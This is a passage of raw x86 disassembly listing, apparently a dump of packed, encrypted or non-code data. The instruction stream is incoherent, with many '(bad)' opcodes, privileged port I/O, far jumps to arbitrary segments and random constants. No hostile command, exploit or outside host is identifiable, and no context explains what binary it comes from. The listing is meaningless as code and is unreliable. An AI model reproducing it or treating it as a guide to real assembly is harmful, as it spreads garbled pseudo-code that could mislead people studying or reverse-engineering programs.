  40bb59:	rol    BYTE PTR [esi+ebx*8],0xbd
  40bb5d:	pop    es
  40bb5e:	mov    cl,0xb2
  40bb60:	inc    esi
  40bb61:	ds jne 0x40bb6c
  40bb64:	das    
  40bb65:	dec    esi
  40bb66:	rol    DWORD PTR [ebx+0x27d1a78c],0x40
  40bb6d:	mov    ecx,DWORD PTR [eax]
  40bb6f:	dec    eax
  40bb70:	sbb    al,0x74
  40bb72:	ins    BYTE PTR es:[edi],dx
  40bb73:	or     al,0xbe
  40bb75:	ins    DWORD PTR es:[edi],dx
  40bb76:	in     al,0xd7
  40bb78:	xor    al,0x14
  40bb7a:	lea    esp,[edi-0x1306c6e0]
  40bb80:	and    DWORD PTR [edx+0x4d],eax
  40bb83:	fld    QWORD PTR [eax-0x1c5d17d4]
  40bb89:	or     BYTE PTR [eax+0x2a73a44e],ch
  40bb8f:	in     al,dx
  40bb90:	dec    esi
  40bb91:	stc    
  40bb92:	jmp    DWORD PTR [ebp+0xf]
  40bb95:	xor    ebx,DWORD PTR [edi]
  40bb97:	or     esp,esi
  40bb99:	mov    dh,0x55
  40bb9b:	xchg   esp,eax
  40bb9c:	mov    eax,ds:0xf944a6e8
  40bba1:	adc    DWORD PTR [esi+eax*4],esp
  40bba4:	adc    DWORD PTR [ebx+0xf],eax
  40bba7:	(bad)  
  40bba8:	push   ss
  40bba9:	inc    edi
  40bbaa:	sub    edi,ebp
  40bbac:	mov    edx,DWORD PTR [ebx]
  40bbae:	push   esp
  40bbaf:	mov    BYTE PTR [ecx+esi*8],cl
  40bbb2:	out    dx,al
  40bbb3:	data16 out 0x35,al
  40bbb6:	jno    0x40bc28
  40bbb8:	xor    BYTE PTR [edi],dl
  40bbba:	jne    0x40bbc2
  40bbbc:	add    BYTE PTR [eax-0x505564ff],0xc2
  40bbc3:	out    0xb1,al
  40bbc5:	lods   eax,DWORD PTR ds:[esi]
  40bbc6:	fmul   st(1),st
  40bbc8:	jbe    0x40bb87
  40bbca:	test   al,0xcb
  40bbcc:	add    al,0xfc
  40bbce:	call   0x28158c69
  40bbd3:	jle    0x40bb7e
  40bbd5:	cvtps2pi mm6,QWORD PTR [ebx]
  40bbd8:	test   al,0x62
  40bbda:	sahf   
  40bbdb:	jmp    0x40bc09
  40bbdd:	xor    DWORD PTR [ebp+0x38],edx
  40bbe0:	dec    ebp
  40bbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe2:	(bad)  
  40bbe3:	pop    edx
  40bbe4:	outs   dx,BYTE PTR ds:[esi]
  40bbe5:	call   0xccb4c2b4
  40bbea:	jbe    0x40bb8c
  40bbec:	(bad)  
  40bbee:	bound  ecx,QWORD PTR [ebx+0x1d]
  40bbf1:	push   edx
  40bbf2:	dec    ecx
  40bbf3:	loope  0x40bb77
  40bbf5:	jae    0x40bbbb
  40bbf7:	adc    DWORD PTR [ebp+0x3634caa8],edi
  40bbfd:	lea    esp,[esp+ecx*4-0x3e0035bf]
  40bc04:	push   ecx
  40bc05:	dec    edx
  40bc06:	jl     0x40bb99
  40bc08:	jmp    0x61a1:0x8603bf7
  40bc0f:	sub    BYTE PTR [edi-0x614ad33a],0x24
  40bc16:	pushf  
  40bc17:	fucom  st(2)
  40bc19:	nop
  40bc1a:	scas   al,BYTE PTR es:[edi]
  40bc1b:	xchg   BYTE PTR [edx-0x7e],ah
  40bc1e:	test   BYTE PTR [ecx-0x9],dh
  40bc21:	dec    esp
  40bc22:	push   cs
  40bc23:	popf   
  40bc24:	jnp    0x40bc0c
  40bc26:	outs   dx,DWORD PTR ds:[esi]
  40bc27:	mov    eax,0xbc2a4f8
  40bc2c:	in     eax,0x17
  40bc2e:	lods   al,BYTE PTR ds:[esi]
  40bc2f:	lds    ecx,FWORD PTR [ecx]
  40bc31:	pop    esp
  40bc32:	dec    edx
  40bc33:	out    0xd8,al
  40bc35:	in     al,dx
  40bc36:	leave  
  40bc37:	sub    DWORD PTR [esi-0x57ee09b9],ecx
  40bc3d:	fstp   TBYTE PTR [esi+0xbdf1bba]
  40bc43:	add    bl,ch
  40bc45:	shl    BYTE PTR [ebx-0xb3ce1cf],0x8a
  40bc4c:	inc    esi
  40bc4d:	(bad)  
  40bc4e:	mov    ecx,0xa199cc71
  40bc53:	xor    al,0x3c
  40bc55:	(bad)  
  40bc56:	dec    eax
  40bc57:	(bad)  
  40bc58:	and    cl,bh
  40bc5a:	mov    ds:0xcf3d7651,eax
  40bc5f:	xchg   ax,ax
  40bc61:	clc    
  40bc62:	jae    0x40bcc1
  40bc64:	and    bh,al
  40bc66:	cmp    eax,0x516f10f1
  40bc6b:	adc    eax,0xbb15831a
  40bc70:	call   0x21df:0x92792a42
  40bc77:	je     0x40bcc6
  40bc79:	jne    0x40bc07
  40bc7b:	mov    esi,0xe3d697e5
  40bc80:	lock or al,ah
  40bc83:	jne    0x40bc59
  40bc85:	xor    BYTE PTR [ebp+0x4fd8f4c2],bl
  40bc8b:	inc    edx
  40bc8c:	test   al,0x37
  40bc8e:	inc    edx
  40bc8f:	or     al,BYTE PTR [ecx-0x20812c32]
  40bc95:	stos   BYTE PTR es:[edi],al
  40bc96:	add    DWORD PTR [edx],eax
  40bc98:	test   BYTE PTR [edx-0x6f],ch
  40bc9b:	cmp    esi,ebx
  40bc9d:	aam    0xbe
  40bc9f:	aam    0x1c
  40bca1:	aam    0x98
  40bca3:	inc    edx
  40bca4:	(bad)  
  40bca6:	sbb    al,0x82
  40bca8:	xchg   edi,eax
  40bca9:	shl    BYTE PTR [eax+0x5b],cl
  40bcac:	push   eax
  40bcad:	mov    ds,WORD PTR [eax]
  40bcaf:	sbb    al,BYTE PTR [bp+si]
  40bcb2:	dec    eax
  40bcb3:	cmp    DWORD PTR [ecx-0x1423ffbc],ebx
  40bcb9:	pop    edi
  40bcba:	inc    esi
  40bcbb:	pop    es
  40bcbc:	and    BYTE PTR [eax+0x7a],0xdc
  40bcc0:	pop    ds
  40bcc1:	outs   dx,DWORD PTR ds:[esi]
  40bcc2:	sbb    dl,ah
  40bcc4:	aam    0x49
  40bcc6:	repnz push cs
  40bcc8:	in     al,0x6c
  40bcca:	es cmc 
  40bccc:	jp     0x40bcb2
  40bcce:	enter  0x770d,0x77
  40bcd2:	jmp    0x8b27897f
  40bcd7:	ss inc esi
  40bcd9:	inc    eax
  40bcda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcdb:	sub    BYTE PTR [edi-0x7e64b974],ah
  40bce1:	ror    dl,1
  40bce3:	inc    esi
  40bce4:	jo     0x40bcb3
  40bce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce7:	fnstenv [ebp-0x66ac1e5f]
  40bced:	aad    0xc7
  40bcef:	ins    DWORD PTR es:[edi],dx
  40bcf0:	xchg   edi,eax
  40bcf1:	mov    edx,0x9f32ebdc
  40bcf6:	pop    edx
  40bcf7:	popf   
  40bcf8:	xor    eax,0x97606371
  40bcfd:	popf   
  40bcfe:	mov    ecx,ss
  40bd00:	or     BYTE PTR [ebx],bh
  40bd02:	jmp    0x40bc95
  40bd04:	push   ebx
  40bd05:	into   
  40bd06:	pshufw mm6,QWORD PTR [eax-0x33],0x74
  40bd0b:	push   0xf10e2779
  40bd10:	mov    bh,0xad
  40bd12:	adc    DWORD PTR [eax],edx
  40bd14:	in     eax,0x5b
  40bd16:	loope  0x40bd46
  40bd18:	cmp    DWORD PTR [ebp+ebx*2+0x45601dcb],esi
  40bd1f:	lea    esp,ss:[edi]
  40bd22:	fwait
  40bd23:	in     eax,0x57
  40bd25:	es icebp 
  40bd27:	mov    esp,0x983d7f9b
  40bd2c:	fucomi st,st(0)
  40bd2e:	repnz or al,BYTE PTR [ecx+0x50]
  40bd32:	out    dx,eax
  40bd33:	or     eax,0x3c4fbcd4
  40bd38:	sbb    al,0xb2
  40bd3a:	inc    edi
  40bd3b:	xor    DWORD PTR [ecx],esi
  40bd3d:	mov    ch,0x2f
  40bd3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd41:	rol    eax,cl
  40bd43:	imul   esi,ebx,0x772286f5
  40bd49:	lods   al,BYTE PTR ds:[esi]
  40bd4a:	adc    ch,cl
  40bd4c:	adc    eax,0xc5be4ee8
  40bd51:	or     DWORD PTR [edx+0x7a],0xffffff85
  40bd55:	fldcw  WORD PTR [edi+0x15b07937]
  40bd5b:	or     eax,0x5d8f3d78
  40bd60:	inc    ebp
  40bd61:	mov    ecx,0x664e04
  40bd66:	mov    cl,0xf
  40bd68:	pop    ebx
  40bd69:	clc    
  40bd6a:	shr    DWORD PTR [edx-0x65f47b25],1
  40bd70:	jg     0x40bd7a
  40bd72:	jle    0x40bddb
  40bd74:	cmp    edx,esp
  40bd76:	sbb    ch,al
  40bd78:	add    edi,eax
  40bd7a:	add    DWORD PTR [edx+0x3eaf58b0],ebx
  40bd80:	stos   DWORD PTR es:[edi],eax
  40bd81:	call   0x475db99
  40bd86:	fs pop ebp
  40bd88:	inc    ebp
  40bd89:	jo     0x40bd73
  40bd8b:	fstp   QWORD PTR [eax+0x50ac8ed2]
  40bd91:	mov    WORD PTR [esi],?
  40bd93:	popa   
  40bd94:	icebp  
  40bd95:	jp     0x40bdc3
  40bd97:	lahf   
  40bd98:	cwde   
  40bd99:	in     al,0x3c
  40bd9b:	jmp    0xed81:0xece4e672
  40bda2:	xchg   edi,eax
  40bda3:	push   0xe11bf62a
  40bda8:	and    BYTE PTR [edi-0x38],bh
  40bdab:	adc    al,0x20
  40bdad:	mov    dl,0x9c
  40bdaf:	mov    cl,0x33
  40bdb1:	stc    
  40bdb2:	cmp    BYTE PTR [ecx],al
  40bdb4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb6:	and    dh,BYTE PTR [edx-0x2d1c442d]
  40bdbc:	ficom  WORD PTR [edx+0x32]
  40bdbf:	mov    BYTE PTR [edx+ebx*2+0x2d529a13],al
  40bdc6:	and    eax,0x92bde7a3
  40bdcb:	es pop esi
  40bdcd:	add    edx,esi
  40bdcf:	cdq    
  40bdd0:	icebp  
  40bdd1:	hlt    
  40bdd2:	pop    edi
  40bdd3:	mov    ds:0x1d621263,al
  40bdd8:	stos   BYTE PTR es:[edi],al
  40bdd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bddb:	xchg   BYTE PTR [eax],ah
  40bddd:	mov    ecx,0xaa283c0
  40bde2:	sub    eax,0x7e55a5a7
  40bde7:	mov    ds:0x772630a6,al
  40bdec:	scas   eax,DWORD PTR es:[edi]
  40bded:	rcl    DWORD PTR [ebx-0x10],1
  40bdf0:	or     BYTE PTR es:[ecx],0x27
  40bdf4:	add    esp,ecx
  40bdf6:	ret    
  40bdf7:	fsub   DWORD PTR [esi+0xb]
  40bdfa:	mov    WORD PTR [esi],cs
  40bdfc:	cld    
  40bdfd:	and    BYTE PTR [eax+0x3561e823],al
  40be03:	lods   eax,DWORD PTR ds:[esi]
  40be04:	pusha  
  40be05:	inc    esi
  40be06:	call   0x938:0x87a9148b
  40be0d:	in     al,0x60
  40be0f:	pop    ds
  40be10:	test   eax,0x10db00f5
  40be15:	mov    ecx,0xd9c8e3d
  40be1a:	adc    al,0x6d
  40be1c:	xchg   esp,eax
  40be1d:	mov    cl,0xee
  40be1f:	scas   eax,DWORD PTR es:[edi]
  40be20:	test   BYTE PTR [eax+eiz*4+0x61862553],dh
  40be27:	and    eax,0x42b62d59
  40be2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be2d:	pop    esi
  40be2e:	shl    DWORD PTR [edi-0x6ff466b2],1
  40be34:	add    al,0x8b
  40be36:	dec    eax
  40be37:	mov    ecx,0x4efcd02a
  40be3c:	(bad)  
  40be3d:	(bad)  
  40be3e:	ds inc ebx
  40be40:	mov    WORD PTR [edi+ebx*1-0x2ac7a582],ss
  40be47:	inc    edi
  40be48:	xchg   ebp,eax
  40be49:	outs   dx,DWORD PTR ds:[esi]
  40be4a:	nop
  40be4b:	sti    
  40be4c:	bound  edi,QWORD PTR [esi+0x2b5913a5]
  40be52:	pushf  
  40be53:	lds    edx,FWORD PTR [edi-0x19]
  40be56:	xchg   ebp,eax
  40be57:	jmp    0x40be1f
  40be59:	or     ah,dl
  40be5b:	addps  xmm7,XMMWORD PTR [esp+ebx*1]
  40be5f:	cmp    al,0x2c
  40be61:	inc    edi
  40be62:	or     ah,0xc5
  40be65:	ds stos BYTE PTR es:[edi],al
  40be67:	pop    es
  40be68:	retf   
  40be69:	fld    TBYTE PTR [edi]
  40be6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6c:	scas   eax,DWORD PTR es:[edi]
  40be6d:	jmp    0x75b569c2
  40be72:	bound  dx,DWORD PTR [ecx+esi*4-0x9]
  40be77:	das    
  40be78:	mov    bl,0x20
  40be7a:	or     DWORD PTR [esi+0x348fc75],edx
  40be80:	outs   dx,DWORD PTR ds:[esi]
  40be81:	imul   edi,DWORD PTR [edi+esi*4-0x678b2cd1],0x3f
  40be89:	mov    ecx,0xfe4dc2c4
  40be8e:	sbb    eax,eax
  40be90:	adc    edx,DWORD PTR [ebp+0x73b8ce28]
  40be96:	xor    eax,0x9740b08f
  40be9b:	sub    ch,BYTE PTR [edi]
  40be9d:	sub    BYTE PTR [esi+0x51735331],ah
  40bea3:	ja     0x40be5f
  40bea5:	xor    DWORD PTR [ecx+0x623fff71],ebp
  40beab:	push   0xffffffcd
  40bead:	nop
  40beae:	(bad)  
  40beaf:	sub    ah,BYTE PTR [ebx+0x740b6c]
  40beb5:	cld    
  40beb6:	aad    0x50
  40beb8:	pop    edx
  40beb9:	adc    dl,cl
  40bebb:	arpl   WORD PTR [ecx+0x2e],dx
  40bebe:	and    ebp,DWORD PTR es:[bx+si+0x16dc]
  40bec4:	pop    ebx
  40bec5:	adc    ah,BYTE PTR [esi+0x950e1dd]
  40becb:	xchg   ecx,eax
  40becc:	das    
  40becd:	push   esp
  40bece:	push   esp
  40becf:	xor    ecx,DWORD PTR [edi+0x31]
  40bed2:	test   DWORD PTR [edx+0x2a],eax
  40bed5:	ins    DWORD PTR es:[edi],dx
  40bed6:	pop    esi
  40bed7:	pop    ebp
  40bed8:	jnp    0x40bed7
  40beda:	stos   DWORD PTR es:[edi],eax
  40bedb:	push   edi
  40bedc:	icebp  
  40bedd:	je     0x40bf08
  40bedf:	or     al,0x29
  40bee1:	out    dx,al
  40bee2:	adc    al,0x88
  40bee4:	aaa    
  40bee5:	sahf   
  40bee6:	hlt    
  40bee7:	out    0x1f,eax
  40bee9:	jae    0x40be86
  40beeb:	imul   edx,DWORD PTR [ebp+0x277e2136],0x43
  40bef2:	and    eax,0x444ca0a
  40bef7:	add    al,0xc0
  40bef9:	test   eax,0xa869196d
  40befe:	neg    ah
  40bf00:	sar    ebx,0x26
  40bf03:	mov    edi,0x8674b0bf
  40bf08:	jnp    0x40bebc
  40bf0a:	dec    esp
  40bf0b:	jno    0x40bf56
  40bf0d:	and    eax,0xf1357703
  40bf12:	popa   
  40bf13:	xchg   edx,eax
  40bf14:	mov    al,0x2b
  40bf16:	mov    eax,0x3184b594
  40bf1b:	imul   esi,DWORD PTR [ecx],0xffffffb1
  40bf1e:	fld    QWORD PTR [esi]
  40bf20:	lea    ebp,[edi]
  40bf22:	stc    
  40bf23:	stos   DWORD PTR es:[edi],eax
  40bf24:	jo     0x40bef8
  40bf26:	or     al,0xee
  40bf28:	hlt    
  40bf29:	cmp    BYTE PTR [eax],0x62
  40bf2c:	sub    DWORD PTR [edi-0x7f],esp
  40bf2f:	cmp    al,0xe6
  40bf31:	cld    
  40bf32:	xor    eax,0x81957a73
  40bf37:	xor    al,0xe2
  40bf39:	shl    ebp,cl
  40bf3b:	and    esi,DWORD PTR [edi-0x4]
  40bf3e:	rcr    ecx,1
  40bf40:	dec    eax
  40bf41:	jo     0x40bf7e
  40bf43:	xchg   esp,eax
  40bf44:	fcomip st,st(2)
  40bf46:	lea    esp,[eax-0x5284f06b]
  40bf4c:	pop    esp
  40bf4d:	imul   eax,DWORD PTR [edx-0x39],0xffffffd1
  40bf51:	cmp    DWORD PTR [edi-0x7],edx
  40bf54:	lods   eax,DWORD PTR ds:[esi]
  40bf55:	in     eax,0xe4
  40bf57:	out    dx,al
  40bf58:	cld    
  40bf59:	mov    edx,0xeed82606
  40bf5e:	pop    es
  40bf5f:	minps  xmm7,XMMWORD PTR [ebx]
  40bf62:	repnz mov eax,ds:0xa6dc017d
  40bf68:	push   esi
  40bf69:	xchg   ecx,eax
  40bf6a:	pop    esp
  40bf6b:	rol    BYTE PTR [ebx+0x7c53d98b],0xb5
  40bf72:	or     ch,BYTE PTR [ebx]
  40bf74:	pop    ss
  40bf75:	sub    ch,BYTE PTR [edi]
  40bf77:	or     DWORD PTR [esi+0x69],0x39
  40bf7b:	mov    eax,0x840975b6
  40bf80:	mov    al,ds:0x4b27bff1
  40bf85:	stos   DWORD PTR es:[edi],eax
  40bf86:	mov    ds:0x97cdda3d,al
  40bf8b:	(bad)  
  40bf8c:	repnz fwait
  40bf8e:	cdq    
  40bf8f:	sub    eax,0x6e138433
  40bf94:	loopne 0x40bfda
  40bf96:	pop    ds
  40bf97:	stos   DWORD PTR es:[edi],eax
  40bf98:	fld    TBYTE PTR [ebp+0x7dfcec10]
  40bf9e:	test   esp,eax
  40bfa0:	mov    ecx,0x2609ed3c
  40bfa5:	sub    ebx,edx
  40bfa7:	enter  0x598,0x33
  40bfab:	or     edi,DWORD PTR [ecx+0x2e709e2b]
  40bfb1:	cli    
  40bfb2:	jno    0x40bfd0
  40bfb4:	sbb    eax,0x8e37a508
  40bfb9:	cmp    esp,DWORD PTR [ebx-0x20]
  40bfbc:	mov    al,0x11
  40bfbe:	sbb    al,ah
  40bfc0:	lods   eax,DWORD PTR ds:[esi]
  40bfc1:	xchg   esi,eax
  40bfc2:	xor    eax,0x5038d888
  40bfc7:	or     DWORD PTR [ebp-0x55],ebx
  40bfca:	jb     0x40bf7f
  40bfcc:	jne    0x40c019
  40bfce:	iret   
  40bfcf:	and    BYTE PTR [edx],0x0
  40bfd2:	xchg   ebx,eax
  40bfd3:	imul   esi,DWORD PTR [ebx-0x33a8f232],0xffffffb2
  40bfda:	cmp    DWORD PTR [ecx+0x49],0x4d925eb8
  40bfe1:	xchg   ecx,edx
  40bfe3:	pushf  
  40bfe4:	fsub   DWORD PTR [ebx+esi*1-0x1739b925]
  40bfeb:	add    eax,eax
  40bfed:	xor    esp,DWORD PTR [eax]
  40bfef:	es and eax,0x3251b07d
  40bff5:	popa   
  40bff6:	fwait
  40bff7:	loop   0x40bfe1
  40bff9:	loop   0x40bff3
  40bffb:	pop    ss
  40bffc:	add    DWORD PTR [edx+0x5b4e0633],ebp
  40c002:	pop    eax
  40c003:	scas   al,BYTE PTR es:[edi]
  40c004:	lds    edx,FWORD PTR ds:0x41cdb799
  40c00a:	(bad)  [ebx+0x64432367]
  40c010:	mov    ebp,0x73513a54
  40c015:	mov    DWORD PTR [ebx],edx
  40c017:	push   edx
  40c018:	sbb    bl,BYTE PTR [eax+ebp*2]
  40c01b:	fild   WORD PTR [ebx-0x77f3d023]
  40c021:	inc    edi
  40c022:	mov    eax,ds
  40c024:	jae    0x40c01c
  40c026:	adc    DWORD PTR [edi+ebx*4+0x12],edi
  40c02a:	icebp  
  40c02b:	test   eax,0x716e01ff
  40c030:	mov    dl,0x2b
  40c032:	mov    cl,0x10
  40c034:	push   edi
  40c035:	ins    DWORD PTR es:[edi],dx
  40c036:	loopne 0x40c01d
  40c038:	call   0x55ac:0x184cd630
  40c03f:	push   0xfffffffd
  40c041:	lds    ebp,FWORD PTR [ecx+eiz*1]
  40c044:	and    eax,edx
  40c046:	std    
  40c047:	into   
  40c048:	das    
  40c049:	adc    bh,BYTE PTR [eax+ecx*8+0x30]
  40c04d:	push   esi
  40c04e:	in     eax,0x5e
  40c050:	or     ah,BYTE PTR [ecx+0x7f]
  40c053:	pop    ss
  40c054:	(bad)  
  40c055:	adc    al,0x14
  40c057:	xchg   ebx,eax
  40c058:	rcr    DWORD PTR [eax],0xd4
  40c05b:	mov    edx,DWORD PTR [ebp+0x259aff23]
  40c061:	iret   
  40c062:	and    BYTE PTR [edx-0x6a4f458e],ah
  40c068:	push   ds
  40c069:	adc    ah,bl
  40c06b:	lahf   
  40c06c:	adc    ebp,DWORD PTR [eax-0x3f]
  40c06f:	ins    BYTE PTR es:[edi],dx
  40c070:	dec    edx
  40c071:	sahf   
  40c072:	and    BYTE PTR [edx+edi*8],ah
  40c075:	mov    al,0xc3
  40c077:	addr16 mov dl,0x24
  40c07a:	pushf  
  40c07b:	and    DWORD PTR [edi],ecx
  40c07d:	jmp    0x40c04b
  40c07f:	outs   dx,DWORD PTR ds:[esi]
  40c080:	xor    al,0x8
  40c082:	and    al,0xd1
  40c084:	fwait
  40c085:	scas   eax,DWORD PTR es:[edi]
  40c086:	xor    al,0x47
  40c088:	fidivr WORD PTR [esi]
  40c08a:	inc    edi
  40c08b:	adc    dl,0x5c
  40c08e:	mov    bh,0x39
  40c090:	ins    DWORD PTR es:[edi],dx
  40c091:	fld    DWORD PTR [edi-0x24]
  40c094:	mov    eax,ds:0x945c41e6
  40c099:	sbb    eax,0xb5c3200c
  40c09e:	in     al,dx
  40c09f:	or     eax,0xd4cdc571
  40c0a4:	arpl   WORD PTR [ecx],sp
  40c0a6:	jge    0x40c0c7
  40c0a8:	std    
  40c0a9:	das    
  40c0aa:	cs ret 
  40c0ac:	das    
  40c0ad:	inc    esi
  40c0ae:	ss clc 
  40c0b0:	pushf  
  40c0b1:	push   ds
  40c0b2:	mov    WORD PTR [ebp-0x5ef50b94],?
  40c0b8:	jmp    0xc0a5:0xdedbbb4a
  40c0bf:	lahf   
  40c0c0:	mov    esp,0x8e3c4806
  40c0c5:	scas   al,BYTE PTR es:[edi]
  40c0c6:	dec    ecx
  40c0c7:	inc    esi
  40c0c8:	dec    ebp
  40c0c9:	shl    BYTE PTR [eax+0x78],1
  40c0cc:	fisttp DWORD PTR [edi+0x52]
  40c0cf:	adc    bh,al
  40c0d1:	add    eax,0x28084eb1
  40c0d6:	retf   
  40c0d7:	and    BYTE PTR [ebx],0xfc
  40c0da:	pop    ss
  40c0db:	test   al,0x8
  40c0dd:	leave  
  40c0de:	in     al,dx
  40c0df:	jp     0x40c12d
  40c0e1:	inc    ebp
  40c0e2:	sti    
  40c0e3:	int3   
  40c0e4:	lds    esp,FWORD PTR [ecx+0x37]
  40c0e7:	mov    fs,WORD PTR [esi-0x36]
  40c0ea:	das    
  40c0eb:	mov    ch,0x2b
  40c0ed:	mov    eax,ss
  40c0ef:	and    al,0x56
  40c0f1:	push   ecx
  40c0f2:	stos   DWORD PTR es:[edi],eax
  40c0f3:	gs loopne 0x40c12c
  40c0f6:	iret   
  40c0f7:	arpl   WORD PTR [ebx],dx
  40c0f9:	push   edi
  40c0fa:	jecxz  0x40c10f
  40c0fc:	push   edi
  40c0fd:	std    
  40c0fe:	push   edi
  40c0ff:	ss push edx
  40c101:	or     ebx,ecx
  40c103:	das    
  40c104:	pop    edx
  40c105:	adc    DWORD PTR [ebx+0x63e6aa12],ebx
  40c10b:	mov    al,ds:0x14f08895
  40c110:	add    al,0x2c
  40c112:	(bad)  
  40c113:	dec    edi
  40c114:	mov    esi,0x480f8c6c
  40c119:	sbb    eax,0x75df9cc6
  40c11e:	jno    0x40c16a
  40c120:	jae    0x40c14b
  40c122:	push   cs
  40c123:	fcom   QWORD PTR ds:0x62aef657
  40c129:	and    ch,dh
  40c12b:	div    BYTE PTR [ecx-0x45bd8109]
  40c131:	mov    ecx,0x8d028c73
  40c136:	loopne 0x40c182
  40c138:	pop    ss
  40c139:	cdq    
  40c13a:	call   0xe2c5:0xb7aabc00
  40c141:	mov    ds:0x37ade229,al
  40c146:	call   0xcdd36432
  40c14b:	stos   DWORD PTR es:[edi],eax
  40c14c:	xchg   BYTE PTR [esi-0x1a7f3b34],cl
  40c152:	pop    esi
  40c153:	dec    edx
  40c154:	cmp    al,0x8
  40c156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c157:	fdivr  st,st(2)
  40c159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c15a:	(bad)  
  40c15b:	xor    esi,DWORD PTR [ebx]
  40c15d:	(bad)  
  40c15e:	inc    esp
  40c15f:	out    0x75,eax
  40c161:	jae    0x40c15c
  40c163:	inc    ecx
  40c164:	ins    BYTE PTR es:[edi],dx
  40c165:	adc    bl,bh
  40c167:	sbb    edx,ebx
  40c169:	xchg   edi,eax
  40c16a:	jle    0x40c1db
  40c16c:	mov    ds:0x85c80acc,al
  40c171:	push   0x17
  40c173:	(bad)  
  40c174:	in     eax,dx
  40c175:	inc    ebx
  40c176:	into   
  40c177:	add    ah,BYTE PTR [ecx-0x3d]
  40c17a:	fsub   QWORD PTR [esi+0x478e8b90]
  40c180:	loop   0x40c163
  40c182:	sub    bh,0xde
  40c185:	jp     0x40c18c
  40c187:	mov    ch,0xea
  40c189:	adc    BYTE PTR [esi],dh
  40c18b:	popf   
  40c18c:	sub    al,0xd7
  40c18e:	gs pop ds
  40c190:	lahf   
  40c191:	jo     0x40c122
  40c193:	xor    al,0x9c
  40c195:	sub    DWORD PTR [esi+ecx*4],0xffffffb5
  40c199:	lods   eax,DWORD PTR ds:[esi]
  40c19a:	push   esi
  40c19b:	and    eax,0x34835835
  40c1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a1:	ja     0x40c136
  40c1a3:	mov    esi,0xcda3b5ed
  40c1a8:	jno    0x40c1d6
  40c1aa:	(bad)  
  40c1ab:	xor    eax,0x226b765d
  40c1b0:	js     0x40c145
  40c1b2:	sbb    edx,DWORD PTR [edi]
  40c1b4:	sbb    DWORD PTR [esi-0x5568b9fd],edi
  40c1ba:	mov    eax,0x75311c7d
  40c1bf:	mov    BYTE PTR [edi-0x32ec8bbb],dh
  40c1c5:	add    esi,ebp
  40c1c7:	mov    ecx,0xe89fa72b
  40c1cc:	pushf  
  40c1cd:	ds adc al,0x55
  40c1d0:	jnp    0x40c1ee
  40c1d2:	xchg   esi,eax
  40c1d3:	push   esi
  40c1d4:	inc    edi
  40c1d5:	and    eax,0xffffffb5
  40c1d8:	iret   
  40c1d9:	jbe    0x40c236
  40c1db:	dec    ebx
  40c1dc:	and    eax,0xd1f4de6b
  40c1e1:	xlat   BYTE PTR ds:[ebx]
  40c1e2:	cmc    
  40c1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e4:	stos   DWORD PTR es:[edi],eax
  40c1e5:	sbb    BYTE PTR [edx+0x6e973b1f],dl
  40c1eb:	pop    ebx
  40c1ec:	xor    al,0xb
  40c1ee:	sbb    edx,DWORD PTR [ebx+0x6c]
  40c1f1:	rol    BYTE PTR [ebp-0x2],0xc2
  40c1f5:	je     0x40c24f
  40c1f7:	mov    ah,dl
  40c1f9:	mov    eax,ds:0x762926c3
  40c1fe:	adc    eax,0xd9613317
  40c203:	test   eax,0xa6ead150
  40c208:	out    0x77,eax
  40c20a:	inc    eax
  40c20b:	inc    ecx
  40c20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20d:	sbb    edi,edi
  40c20f:	mov    esp,0x456be38e
  40c214:	mov    edx,0xce83ab0f
  40c219:	dec    ecx
  40c21a:	jecxz  0x40c239
  40c21c:	mov    ds:0xb6629a28,al
  40c221:	out    dx,eax
  40c222:	xchg   edi,eax
  40c223:	xor    DWORD PTR ds:0x37808458,ecx
  40c229:	fwait
  40c22a:	mov    dl,0xd5
  40c22c:	sub    DWORD PTR [esi+0x4eb3a849],0x62
  40c233:	das    
  40c234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c235:	mov    BYTE PTR ds:0xd7034dc0,dh
  40c23b:	stos   DWORD PTR es:[edi],eax
  40c23c:	sbb    al,0x20
  40c23e:	mov    esi,0x19977a88
  40c243:	inc    edi
  40c244:	imul   ebp,DWORD PTR [ebx],0xe940b85f
  40c24a:	in     al,0x2c
  40c24c:	sub    edx,edi
  40c24e:	std    
  40c24f:	push   0xffffffa4
  40c251:	lock push esi
  40c253:	or     BYTE PTR [esi+0x359514db],bl
  40c259:	(bad)  
  40c25a:	xchg   edx,eax
  40c25b:	mov    esi,0x96ad3dd2
  40c260:	push   edi
  40c261:	in     eax,0x63
  40c263:	adc    ah,BYTE PTR [edx]
  40c265:	addr16 push es
  40c267:	cld    
  40c268:	lods   eax,DWORD PTR ds:[esi]
  40c269:	arpl   WORD PTR [eax],bx
  40c26b:	sar    BYTE PTR [ecx-0x19],1
  40c26e:	or     al,0xf0
  40c270:	retf   0x161b
  40c273:	mov    ecx,0x550d9daa
  40c278:	pop    ds
  40c279:	sub    BYTE PTR [ebx],0x16
  40c27c:	dec    ecx
  40c27d:	aaa    
  40c27e:	jae    0x40c2dd
  40c280:	jne    0x40c2eb
  40c282:	jns    0x40c21f
  40c284:	mov    al,ds:0xdb7ec98c
  40c289:	mov    ds:0x61215a8e,al
  40c28e:	jl     0x40c253
  40c290:	mov    bh,0xa5
  40c292:	mov    ebx,0xbba4dd46
  40c297:	int    0xe5
  40c299:	or     esi,edx
  40c29b:	out    0x2b,al
  40c29d:	cs jae 0x40c23f
  40c2a0:	fisub  DWORD PTR [ebp+0xc]
  40c2a3:	mov    ah,0x63
  40c2a5:	(bad)  
  40c2a7:	test   BYTE PTR [edx+0x4],dl
